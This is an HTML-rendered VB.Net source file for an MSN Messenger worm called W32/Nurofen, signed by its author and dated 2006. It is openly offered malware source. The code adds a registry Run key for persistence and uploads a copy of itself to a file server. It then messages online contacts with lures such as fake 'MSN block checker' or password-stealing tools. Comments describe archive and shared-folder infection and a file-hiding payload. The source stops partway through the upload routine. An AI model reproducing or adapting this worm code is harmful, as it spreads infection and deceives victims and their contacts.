<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>MSIL.nuroWorm - W32.Nurofen.worm.vb.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">MessengerAPI</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">System.Diagnostics</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">System.Reflection</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">Microsoft.Win32</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">System.IO</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">System.Net</span><span class="sc0">
</span><span class="sc3">Imports</span><span class="sc0"> </span><span class="sc7">System.Text</span><span class="sc0">

</span><span class="sc1">'A basic MSN Messanger &amp; ZIP/RAR Archive &amp; MSN shares worm.. Don't try to spread it!
'Written in VB.Net due to synge complaining that there isnt enough VB.Net malware lol
</span><span class="sc0">
</span><span class="sc1">'''''''''''''''''''''''''''''''''
'     Genetix {Doomriderz}      '
'       W32/Nurofen.worm        '
'           XMAS 2006           '
'''''''''''''''''''''''''''''''''
</span><span class="sc0">
</span><span class="sc1">'1: adds to registry run key to start with windows "c:\MSNUpdate.exe".
'2: waits for msn to load by checking processes for "msnmsgr" then waits and checks to see if it's signed in and appear as online.
'3: uploads a copy of itself to the filesever with a random file name
'4: get's a random topic &amp; gets all online contacts
'5: sends the random topic with the url to the worm download &amp; url to DotNet framework 2.0 :p
'6: checks if the WinRar.exe exists by checking for the path in the registry
'7: searches for rar &amp; zip files in it's folder and drops a copy of itself inside them
'8: Find MSN shared folders and copy as "Game.exe" to them.
'9: Kinda harmless payload that hides every file on the drive (attr +H)
</span><span class="sc0">
</span><span class="sc1">'My worm will work depending on the follwoing reasons:
'1: The file server used dont change how it handles uploads
'2: You dont change the code and mess it all up!
'3: you have .net 2.0
'4: you have internet access
'4: its bug free (i think it is but report any bugs to me genetix [AT] phreaker [Dot] net
'5: If it dont work for people trying to spread it then I dont care! I hope it fails on you.
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Class</span><span class="sc0"> </span><span class="sc7">Form1</span><span class="sc0">
    </span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">MAX_PATH</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">

    </span><span class="sc1">'declare some API's / variables... ect that will be used globaly in this worm
</span><span class="sc0">    </span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Auto</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetShortPathName</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
    </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpszLongPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
    </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpszShortPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">System.Text.StringBuilder</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
    </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cchBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
    </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"http://MSDOTNET.notlong.com"</span><span class="sc0"> </span><span class="sc1">'short url to .net 2.0
</span><span class="sc0">    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">RarPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">WormPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">WormFile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">msn</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">Messenger</span><span class="sc6">()</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Victims</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">IMessengerContacts</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Victim</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">IMessengerContact</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Worm</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
    </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">KeyTitle</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"MSNUpdate"</span><span class="sc0">
    </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">subkey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc0">

    </span><span class="sc1">'This sub deals with calling other needed sub's/functions and is the main body 
</span><span class="sc0">    </span><span class="sc1">'of the contacts spreading.
</span><span class="sc0">    </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">MSN_Worm</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc7">upload</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc7">File.Delete</span><span class="sc6">(</span><span class="sc7">Worm</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">15</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
        </span><span class="sc7">Randomize</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc1">''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">        </span><span class="sc1">'some lame messages to fool the user into getting this worm..  '
</span><span class="sc0">        </span><span class="sc1">''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">        </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"New msn block checker 1.5 Download here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">" you will need to install the .net framework to run this application, here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0">
        </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"MSN Block checker download "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">" you will need to install the .net framework to run this application, here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0">
        </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Working MSN block checker "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">" you will need to install the .net framework to run this application, here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0">
        </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Free MSN Add-ons limited! "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">" you will need to install the .net framework to run this application, here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0">
        </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">5</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"New MSN messanger 2007 "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">" you will need to install the .net framework to run this application, here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0">
        </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">6</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Find out who's blocked you! "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">" you will need to install the .net framework to run this application, here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0">
        </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">7</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Download the new MSN block checker! "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">" you will need to install the .net framework to run this application, here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0">
        </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Download the new MSN smilie kit! "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">" you will need to install the .net framework to run this application, here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0">
        </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">9</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"NEW MSN BLOCK CHECKER DOWNLOAD NOW! "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">" you will need to install the .net framework to run this application, here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0">
        </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">10</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Download the new MSN bot it talks like a real person!! "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">" you will need to install the .net framework to run this application, here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0">
        </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">11</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"New MSN tool get it now! "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">" you will need to install the .net framework to run this application, here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0">
        </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">12</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Download our new MSN block checker "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">" you will need to install the .net framework to run this application, here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0">
        </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">13</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Find out who is blocking you on MSN "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">" you will need to install the .net framework to run this application, here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0">
        </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">14</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"This program can get your friends MSN passwords!! "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">" you will need to install the .net framework to run this application, here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0">
        </span><span class="sc7">message</span><span class="sc6">(</span><span class="sc2">15</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Find out your friends MSN passwords! "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">" you will need to install the .net framework to run this application, here: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">DotNet</span><span class="sc0">

        </span><span class="sc1">''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">        </span><span class="sc1">'okay so now it searches for online contacts and and opens a       '
</span><span class="sc0">        </span><span class="sc1">'a chat window to send its download link then closes the window..  ' 
</span><span class="sc0">        </span><span class="sc1">'all done kinda reall fast                                         '
</span><span class="sc0">        </span><span class="sc1">''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">        </span><span class="sc7">Victims</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">msn.MyContacts</span><span class="sc0">
        </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">Victim</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">Victims</span><span class="sc0">
            </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Victim.Status</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">MISTATUS.MISTATUS_OFFLINE</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
                </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Victim.Blocked</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
                    </span><span class="sc7">msn.InstantMessage</span><span class="sc6">(</span><span class="sc7">Victim.SigninName</span><span class="sc6">)</span><span class="sc0">
                    </span><span class="sc7">SendKeys.SendWait</span><span class="sc6">(</span><span class="sc7">message</span><span class="sc6">(</span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc2">15</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">())</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0">
                    </span><span class="sc7">SendKeys.SendWait</span><span class="sc6">(</span><span class="sc4">"{ENTER}"</span><span class="sc6">)</span><span class="sc0">
                    </span><span class="sc7">SendKeys.SendWait</span><span class="sc6">(</span><span class="sc4">"{ESC}"</span><span class="sc6">)</span><span class="sc0">
                </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
            </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
        </span><span class="sc3">Next</span><span class="sc0">

        </span><span class="sc1">''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">        </span><span class="sc1">'call sub to get WinRar from registry then check if it exist   '
</span><span class="sc0">        </span><span class="sc1">'if so, call the rar worm function (also for .zip)             '
</span><span class="sc0">        </span><span class="sc1">''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">        </span><span class="sc7">RarPath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetRarPath</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">File.Exists</span><span class="sc6">(</span><span class="sc7">RarPath</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
            </span><span class="sc7">RarWorm</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
        </span><span class="sc1">''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">        </span><span class="sc1">'call MSN shares spreading sub                                 '
</span><span class="sc0">        </span><span class="sc1">''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">        </span><span class="sc7">MSN_Share_drop</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc7">Randomize</span><span class="sc6">()</span><span class="sc0">

        </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">        </span><span class="sc1">'to check if payload should activate via random number comparing  '
</span><span class="sc0">        </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc2">200</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">())</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
            </span><span class="sc7">payload</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

    </span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Timer_Tick</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">sender</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">System.Object</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">e</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">System.EventArgs</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Handles</span><span class="sc0"> </span><span class="sc7">Timer.Tick</span><span class="sc0">
        </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">        </span><span class="sc1">'The worm need's to know when MSN starts/When its online/If its   '
</span><span class="sc0">        </span><span class="sc1">'already running ect.. this this timer deals with all that stuff  '
</span><span class="sc0">        </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">FindProcess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Process</span><span class="sc0">
        </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">FindProcess</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">Process.GetProcesses</span><span class="sc6">(</span><span class="sc7">System.Environment.MachineName</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">FindProcess.ToString</span><span class="sc6">().</span><span class="sc7">IndexOf</span><span class="sc6">(</span><span class="sc4">"msnmsgr"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
                </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">msn.MyStatus</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">MISTATUS.MISTATUS_ONLINE</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
                    </span><span class="sc7">Timer.Enabled</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
                    </span><span class="sc7">MSN_Worm</span><span class="sc6">()</span><span class="sc0">
                </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
            </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
        </span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">FindProcess</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

    </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">upload</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">        </span><span class="sc1">'  Thx you retro soooo much~! most of this sub is all his code but i rewrote it in VB.net for this  '
</span><span class="sc0">        </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">        </span><span class="sc1">'Well this is very kewl! it uploads itself to the file server and gets the link to download it
</span><span class="sc0">        </span><span class="sc1">'thats all but It's good!
</span><span class="sc0">        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">pos</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">pos2</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sKey</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">key</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">boundary</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Guid.NewGuid</span><span class="sc6">().</span><span class="sc7">ToString</span><span class="sc6">().</span><span class="sc7">Replace</span><span class="sc6">(</span><span class="sc4">"-"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">fs</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">FileStream</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">File.OpenRead</span><span class="sc6">(</span><span class="sc7">Worm</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">bytes</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc6">(</span><span class="sc7">fs.Length</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">{}</span><span class="sc0">
        </span><span class="sc7">fs.Read</span><span class="sc6">(</span><span class="sc7">bytes</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bytes.Length</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">fs.Close</span><span class="sc6">()</span><span class="sc0">

        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">mimebody</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"--"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc7">boundary</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Constants.vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"Content-Disposition: form-data; name=""MAX_FILE_SIZE"""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
